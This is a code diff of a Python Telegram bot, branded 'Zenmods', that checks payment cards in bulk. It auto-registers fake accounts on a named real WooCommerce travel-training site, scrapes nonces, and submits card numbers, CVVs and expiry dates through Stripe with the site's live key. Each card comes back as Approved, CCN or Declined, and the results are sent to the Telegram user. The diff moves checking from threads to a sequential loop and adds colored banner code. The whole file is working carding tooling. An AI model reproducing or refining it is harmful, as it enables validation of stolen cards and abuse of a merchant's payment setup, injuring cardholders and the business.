@@ -1,4 +1,3 @@
-from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime, timedelta
 import io
 import os
@@ -17,7 +16,106 @@ authorized_users = set()
 
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="Markdown")
 print_lock = threading.Lock()
-session_lock = threading.Lock()
+
+anasxzer00 = f"""
+Join Channel for new updates.
+"""
+
+def mc_tools():
+    banner = anasxzer00
+    print_red(banner)
+
+def by_anasxzer00(text):
+    for char in text:
+        print(f'\033[91m{char}\033[0m', end='', flush=True)
+        time.sleep(0.03)
+    print()
+
+anasxzer00_best = ["requests", "bs4", "re", "json", "random", "string", "datetime"]
+
+def print_line():
+    print_red(f"""|-|==========================================|-|""")
+
+def print_sline():
+    print_cyan(f"""|----------------------------------------------|""")
+
+def print_red(text):
+    print(f"\033[91m{text}\033[0m")
+
+def print_green(text):
+    print(f"\033[92m{text}\033[0m")
+
+def print_yellow(text):
+    print(f"\033[93m{text}\033[0m")
+
+def print_blue(text): 
+    print(f"\033[94m{text}\033[0m")
+
+def print_magenta(text): 
+    print(f"\033[95m{text}\033[0m")
+
+def print_cyan(text): 
+    print(f"\033[96m{text}\033[0m")
+
+def print_white(text): 
+    print(f"\033[97m{text}\033[0m")
+
+def print_grey(text): 
+    print(f"\033[90m{text}\033[0m")
+
+def print_light_blue(text): 
+    print(f"\033[104m{text}\033[0m")
+
+def print_light_cyan(text): 
+    print(f"\033[106m{text}\033[0m")
+
+def print_light_grey(text): 
+    print(f"\033[47m{text}\033[0m")
+
+def print_light_magenta(text): 
+    print(f"\033[105m{text}\033[0m")
+
+def print_dark_blue(text): 
+    print(f"\033[34m{text}\033[0m")
+
+def print_dark_magenta(text): 
+    print(f"\033[35m{text}\033[0m")
+
+def print_dark_cyan(text): 
+    print(f"\033[36m{text}\033[0m")
+
+def print_dark_grey(text): 
+    print(f"\033[90m{text}\033[0m")
+
+def print_dark_green(text): 
+    print(f"\033[32m{text}\033[0m")
+
+def print_dark_yellow(text): 
+    print(f"\033[33m{text}\033[0m")
+
+def print_dark_red(text): 
+    print(f"\033[31m{text}\033[0m")
+
+def print_bright_blue(text): 
+    print(f"\033[94m{text}\033[0m")
+
+def print_bright_magenta(text): 
+    print(f"\033[95m{text}\033[0m")
+
+def print_bright_cyan(text): 
+    print(f"\033[96m{text}\033[0m")
+
+def print_bright_grey(text): 
+    print(f"\033[97m{text}\033[0m")
+
+def print_bright_green(text): 
+    print(f"\033[92m{text}\033[0m")
+
+def print_bright_yellow(text): 
+    print(f"\033[93m{text}\033[0m")
+
+def print_bright_red(text): 
+    print(f"\033[91m{text}\033[0m")
 
 def gggggggggggggggggg(length=9, domain=None):
     common_domains = ["gmail.com"]
@@ -39,24 +137,26 @@ def create_session():
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
         }
         response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
-        if response.status_code != 200:
-            return None
+        html = response.text
+        soup = BeautifulSoup(html, 'html.parser')
+        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
+        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
         
-        soup = BeautifulSoup(response.text, 'html.parser')
-        nonce_elem = soup.find('input', {'id': 'afurd_field_nonce'})
-        noncee_elem = soup.find('input', {'id': 'woocommerce-register-nonce'})
-        
-        if not nonce_elem or not noncee_elem:
-            return None
-            
-        nonce = nonce_elem['value']
-        noncee = noncee_elem['value']
-        
+        headers = {
+            'authority': 'www.thetravelinstitute.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://www.thetravelinstitute.com',
+            'referer': 'https://www.thetravelinstitute.com/register/',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+        }
         data = [
-            ('afurd_field_nonce', nonce),
+            ('afurd_field_nonce', f'{nonce}'),
             ('_wp_http_referer', '/register/'),
             ('pre_page', ''),
-            ('email', email),
+            ('email', f'{email}'),
             ('password', 'rokyNoa5954J'),
             ('wc_order_attribution_source_type', 'typein'),
             ('wc_order_attribution_referrer', 'https://www.thetravelinstitute.com/my-account/payment-methods/'),
@@ -74,22 +174,22 @@ def create_session():
             ('wc_order_attribution_session_pages', '8'),
             ('wc_order_attribution_session_count', '1'),
             ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'),
-            ('woocommerce-register-nonce', noncee),
+            ('woocommerce-register-nonce', f'{noncee}'),
             ('_wp_http_referer', '/register/'),
             ('register', 'Register'),
         ]
-        post_response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
-        return session if post_response.status_code == 200 else None
-    except Exception:
+        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
+        if response.status_code == 200:
+            return session
+        else:
+            return None
+    except Exception as e:
         return None
 
 def save_session_to_file(session, file_path):
-    try:
-        with open(file_path, "w") as file:
-            cookies = session.cookies.get_dict()
-            file.write(str(cookies))
-    except Exception:
-        pass
+    with open(file_path, "w") as file:
+        cookies = session.cookies.get_dict()
+        file.write(str(cookies))
 
 def load_session_from_file(file_path):
     try:
@@ -99,27 +199,23 @@ def load_session_from_file(file_path):
             cookies = eval(session_data)
             session.cookies.update(cookies)
             return session
-    except Exception:
+    except Exception as e:
         return None
 
 def manage_session_file():
-    with session_lock:
-        session_file = "anasxzer00-session.txt"
-        if os.path.exists(session_file):
-            session = load_session_from_file(session_file)
-            if session:
-                return session
-        session = create_session()
+    session_file = "anasxzer00-session.txt"
+    if os.path.exists(session_file):
+        session = load_session_from_file(session_file)
         if session:
-            save_session_to_file(session, session_file)
             return session
+    session = create_session()
+    if session:
+        save_session_to_file(session, session_file)
+        return session
+    else:
         return None
 
-def check_single_cc(cc_line):
-    session = manage_session_file()
-    if not session:
-        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nError: Session creation failed"
-
+def check_single_cc(cc_line, session):
     try:
         card = cc_line.replace('/', '|')
         lista = card.split("|")
@@ -135,18 +231,16 @@ def check_single_cc(cc_line):
 
         headers = {
             'authority': 'www.thetravelinstitute.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
+            'referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
         }
         response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=20)
         html = response.text
-        nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html)
-        if not nonce_match:
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: Nonce extraction failed"
-        nonce = nonce_match.group(1)
-
-        headers_stripe = {
+        nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(1)
+        
+        headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
             'accept-language': 'en-US,en;q=0.9',
@@ -155,26 +249,21 @@ def check_single_cc(cc_line):
             'referer': 'https://js.stripe.com/',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
         }
-        data_stripe = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
-
-        # Using session instead of global requests.post to maintain connection pool stability
-        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=20)
+        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
         
-        try:
-            res_json = stripe_response.json()
-        except Exception:
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: Invalid Stripe JSON response"
-
-        if 'error' in res_json:
-            error = res_json['error'].get('message', 'Unknown Stripe Error')
-            status = "CCN ✅" if 'code' in res_json['error'] else "Declined ❌"
-            return f"ZENMODS CHECKER ⚡\n{status}\n{card}\nError: {error}"
+        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
+        res = response.text
+        iddd = ''
+        
+        if 'error' in res:
+            error = response.json()['error']['message']
+            if 'code' in error:
+                return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nError: {error}"
+            else:
+                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: {error}"
         else:
-            iddd = res_json.get('id')
-            if not iddd:
-                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: Payment method ID missing"
-
-            headers_confirm = {
+            iddd = response.json()['id']
+            headers = {
                 'authority': 'www.thetravelinstitute.com',
                 'accept': '*/*',
                 'accept-language': 'en-US,en;q=0.9',
@@ -187,44 +276,34 @@ def check_single_cc(cc_line):
             params = {
                 'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
             }
-            data_confirm = {
+            data = {
                 'action': 'create_and_confirm_setup_intent',
                 'wc-stripe-payment-method': iddd,
                 'wc-stripe-payment-type': 'card',
                 '_ajax_nonce': nonce,
             }
-            confirm_response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers_confirm, data=data_confirm, timeout=20)
-            
-            try:
-                confirm_json = confirm_response.json()
-            except Exception:
-                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: Invalid confirmation JSON response"
-
-            if confirm_json.get('success') is False:
-                error = confirm_json.get('data', {}).get('error', {}).get('message', 'Unknown confirmation error')
-                status = "CCN ✅" if 'code' in confirm_json.get('data', {}).get('error', {}) else "Declined ❌"
-                return f"ZENMODS CHECKER ⚡\n{status}\n{card}\nError: {error}"
+            response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=20)
+            res_json = response.json()
+            if res_json['success'] == False:
+                error = res_json['data']['error']['message']
+                if 'code' in error:
+                    return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nError: {error}"
+                else:
+                    return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: {error}"
             else:
                 return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nStatus: Approved!"
     except Exception as e:
         return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nError: {str(e)}"
 
 def process_bulk_file(chat_id, file_content):
-    lines = [
-        line.strip()
-        for line in file_content.decode("utf-8").splitlines()
-        if line.strip()
-    ]
+    lines = [line.strip() for line in file_content.decode("utf-8").splitlines() if line.strip()]
     total_cards = len(lines)
 
     if total_cards == 0:
         bot.send_message(chat_id, "⚠️ File is empty or no cards found!")
         return
 
-    msg = bot.send_message(
-        chat_id,
-        f"⚡ **Zenmods Advanced Engine** ⚡\nTotal cards found: `{total_cards}`.\n🚀 Initializing multi-threaded check with thread-safe session management...",
-    )
+    msg = bot.send_message(chat_id, f"⚡ **Zenmods Advanced Engine** ⚡\nTotal cards found: `{total_cards}`.\n🚀 Initializing sequential checking...")
     msg_id = msg.message_id
 
     approved_count = 0
@@ -233,64 +312,46 @@ def process_bulk_file(chat_id, file_content):
     error_count = 0
 
     detailed_results = []
-    completed = 0
+    session = manage_session_file()
+    
+    if not session:
+        bot.send_message(chat_id, "❌ Session creation failed!")
+        return
 
-    def worker(card_line):
-        nonlocal completed, approved_count, ccn_count, declined_count, error_count
-        res = check_single_cc(card_line)
-        with print_lock:
-            completed += 1
-            detailed_results.append(res)
-            if "Approved ✅" in res:
-                approved_count += 1
-                zenmods_animation = (
-                    "🌟✨💫 **Z E N M O D S   H I T !** 💫✨🌟\n"
-                    "🔥 *The anvil rings true, a legendary strike!* 🔥\n\n"
-                    f"{res}\n\n"
-                    "🎇🎆🎇🎆🎇🎆🎇🎆"
-                )
-                bot.send_message(chat_id, zenmods_animation)
-            elif "CCN ✅" in res:
-                ccn_count += 1
-                bot.send_message(chat_id, res)
-            elif "Declined ❌" in res:
-                declined_count += 1
-            else:
-                error_count += 1
+    for index, card_line in enumerate(lines, start=1):
+        res = check_single_cc(card_line, session)
+        detailed_results.append(res)
+        
+        if "Approved ✅" in res:
+            approved_count += 1
+            zenmods_animation = (
+                "🌟✨💫 **Z E N M O D S   H I T !** 💫✨🌟\n"
+                "🔥 *The anvil rings true, a legendary strike!* 🔥\n\n"
+                f"{res}\n\n"
+                "🎇🎆🎇🎆🎇🎆🎇🎆"
+            )
+            bot.send_message(chat_id, zenmods_animation)
+        elif "CCN ✅" in res:
+            ccn_count += 1
+            bot.send_message(chat_id, res)
+        elif "Declined ❌" in res:
+            declined_count += 1
+        else:
+            error_count += 1
 
-            if completed % 3 == 0 or completed == total_cards:
-                progress_text = (
-                    f"⚡ **Zenmods Advanced Engine** ⚡\n"
-                    f"Progress: `[{completed}/{total_cards}]` ({int((completed/total_cards)*100)}%)\n"
-                    f"Processing cards concurrently..."
-                )
-                try:
-                    bot.edit_message_text(progress_text, chat_id, msg_id)
-                except Exception:
-                    pass
+        if index % 3 == 0 or index == total_cards:
+            progress_text = f"⚡ **Zenmods Advanced Engine** ⚡\nProgress: `[{index}/{total_cards}]` ({int((index/total_cards)*100)}%)\nProcessing cards sequentially..."
+            try:
+                bot.edit_message_text(progress_text, chat_id, msg_id)
+            except Exception:
+                pass
 
-    with ThreadPoolExecutor(max_workers=3) as executor:
-        executor.map(worker, lines)
-
-    report = (
-        f"📊 **ZENMODS ADVANCED CHECK REPORT** 📊\n\n"
-        f"Total Checked: `{total_cards}`\n"
-        f"Approved ✅: `{approved_count}`\n"
-        f"CCN ✅: `{ccn_count}`\n"
-        f"Declined ❌: `{declined_count}`\n"
-        f"Errors/Invalid: `{error_count}`\n\n"
-        f"🏁 Advanced checking completed successfully!"
-    )
+    report = f"📊 **ZENMODS ADVANCED CHECK REPORT** 📊\n\nTotal Checked: `{total_cards}`\nApproved ✅: `{approved_count}`\nCCN ✅: `{ccn_count}`\nDeclined ❌: `{declined_count}`\nErrors/Invalid: `{error_count}`\n\n🏁 Advanced checking completed successfully!"
     bot.send_message(chat_id, report)
 
-    file_data = "\n\n".join(detailed_results)
-    file_bytes = io.BytesIO(file_data.encode("utf-8"))
+    file_bytes = io.BytesIO("\n\n".join(detailed_results).encode("utf-8"))
     file_bytes.name = "Zenmods_Detailed_Stripe_Report.txt"
-    bot.send_document(
-        chat_id,
-        file_bytes,
-        caption="Zenmods Detailed Stripe Report"
-    )
+    bot.send_document(chat_id, file_bytes, caption="Zenmods Detailed Stripe Report")
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -323,4 +384,7 @@ def handle_document(message):
         bot.reply_to(message, f"⚠️ Error processing file: {str(e)}")
 
 if __name__ == "__main__":
+    mc_tools()
+    print_line()
+    by_anasxzer00(' -- Zenmods Telegram Bot Engine Initialized Successfully!')
     bot.infinity_polling()
